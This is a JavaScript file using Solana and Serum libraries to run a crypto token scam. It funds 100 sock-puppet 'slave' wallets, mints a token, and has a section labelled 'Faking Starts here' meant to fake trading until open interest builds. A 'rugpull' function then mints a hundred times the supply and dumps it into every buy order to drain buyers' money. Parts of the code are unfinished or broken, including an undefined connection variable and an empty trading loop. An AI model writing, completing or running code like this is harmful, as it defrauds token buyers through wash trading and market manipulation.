const solana = require('@solana/web3.js');
const spl = require('@solana/spl-token');
const serum = require('@project-serum/serum');
const lo = require('@solana/buffer-layout');
const loutil = require('@solana/buffer-layout-utils');

const chain = 'devnet';
const blockchain = new solana.Connection(solana.clusterApiUrl(chain), 'confirmed');
const master = solana.Keypair.fromSecretKey(new Uint8Array([]));

const freeze = true;
const supply = 100000000;
const decimals = 2;

const slaves = [];
const slaveCount = 100;
if (chain == 'devnet')
{
    for (let i = 0; i < slaveCount; i++)
    {
        let keypair = solana.Keypair.generate();
        slaves.push(keypair);
        solana.sendAndConfirmTransaction(blockchain, new solana.Transaction(
            solana.SystemProgram.transfer({
                fromPubkey: master.publicKey,
                toPubkey: keypair.publicKey,
                lamports: 0.01 * solana.LAMPORTS_PER_SOL
            })
        ));
        let airdrop = await connection.requestAirdrop(
            keypair.publicKey,
            solana.LAMPORTS_PER_SOL
        );
        await blockchain.confirmTransaction(airdrop);
    }
}
else if (chain == 'mainnet')
{
    for (let i = 0; i < slaveCount; i++)
    {
        let keypair = solana.Keypair.generate();
        slaves.push(keypair);
        //Calculate token distribution and send
    }
}
//Create Shitcoin
/*
    Coming Soon! Tokenomics Selection and Management.
    Custom Mint Contracts with raw code or customizable features
*/
let mint = undefined;
let account = undefined;
setTimeout(async function() {
    mint = await spl.createMint(blockchain, master, master.publicKey, freeze ? master.publicKey : null, decimals, spl.TOKEN_PROGRAM_ID);
    const token = await spl.getMint(blockchain, mint);
    account = await spl.getOrCreateAssociatedTokenAccount(
        blockchain,
        master,
        mint,
        master.publicKey
    );
    const mintResult = await spl.mintTo(
        blockchain,
        master,
        mint,
        account.address,
        master,
        supply
    );
}, 20000); //Max 20 seconds mint time, otherwise we mark the mint as a failure

//Push to DEX's
let tradeAddress = "";

//Rugpull
async function rugpull(market)
{
    setTimeout(async function() {
        const mintResult = await spl.mintTo(
            blockchain,
            master,
            mint,
            account.address,
            master,
            supply * 100
        );
    }, 20000);
    let asks = await market.loadAsks(blockchain);
    for (let [price, size] of asks.getL2(200))
    {
        await market.placeOrder(blockchain, {
            account,
            master,
            side: 'sell',
            price: price,
            size: account.balance,
            orderType: 'ioc'
        });
    }
    for (let openOrders of await market.findOpenOrdersAccountsForOwner(
        blockchain,
        account.address
    ))
    {
        if (openOrders.baseTokenFree > 0 || openOrders.quoteTokenFree > 0)
        {
            let baseTokenAccount = master.publicKey;
            let quoteTokenAccount = account.address;

            await market.settleFunds(
                blockchain,
                master,
                openOrders,
                baseTokenAccount,
                quoteTokenAccount
            );
        }
    }
}

//Faking Starts here
let market = await serum.Market.load(blockchain, tradeAddress);
let openInterestMet = false;
while (!openInterestMet)
{
    //Check Open Interest

    //Trade Here
}

rugpull(market);